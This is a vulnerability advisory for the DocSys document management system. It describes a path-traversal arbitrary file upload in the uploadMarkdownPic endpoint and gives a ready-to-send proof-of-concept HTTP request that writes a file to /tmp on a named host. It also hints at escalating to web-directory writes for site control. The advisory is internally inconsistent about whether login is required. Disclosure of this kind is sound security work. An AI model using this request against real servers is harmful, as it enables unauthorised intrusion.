# DocSys-Arbitrary file upload vulnerability

## Vulnerability Description

DocSys-master is a document management system. Its authenticated uploadMarkdownPic interface in src/com/DocSystem/controller/DocController.java has an arbitrary file upload vulnerability:

---

## Affected Versions

DocSys-master（latest version）V2.02.85

[DocSys_V2.02.85](https://gitee.com/RainyGao/DocSys/releases/tag/DocSys_V2.02.85)

---

## Utilize conditions

- remote access
- No login required

---

## Vulnerability Reproduction

### Upload any file

**File path**：`src/com/DocSystem/controller/DocController.java`
**line number**：2019-2024

The user request parameters, namely the String imgName and MultipartFile file, are directly obtained from the HTTP request and are controllable by the user

![image-20260803194710833](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803194710833.2dpeudmzqb.webp)

Line numbers: 2081-2088 — imgName is directly assigned to fileName without any path verification
Line numbers: 2090-2095 — Create directory (only create the res/ directory, do not verify the target path)
Line number: 2097 — File write

![image-20260803195014637](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803195014637.6f1e8rrdzl.webp)

---

Vulnerability Reproduction：

**Request package**：Upload files at the front desk

```
POST /DocSystem/Doc/uploadMarkdownPic.do?reposId=9&path=Lw&name=dGVzdC50eHQ&imgName=../../../../../../../../tmp/test2026.txt HTTP/1.1
Host: dw.gofreeteam.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Content-Length: 147

------WebKitFormBoundary
Content-Disposition: form-data; name="editormd-image-file"; filename="test.txt"

test2026
------WebKitFormBoundary--
```

![image-20260803183835811](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803183835811.96aggudw3o.webp)

The file has been successfully uploaded to /tmp/test2026.txt. You can upload it to the web directory to obtain website permissions. The file has been successfully uploaded to /tmp/test2026.txt. You can upload it to the web directory to obtain website permissions



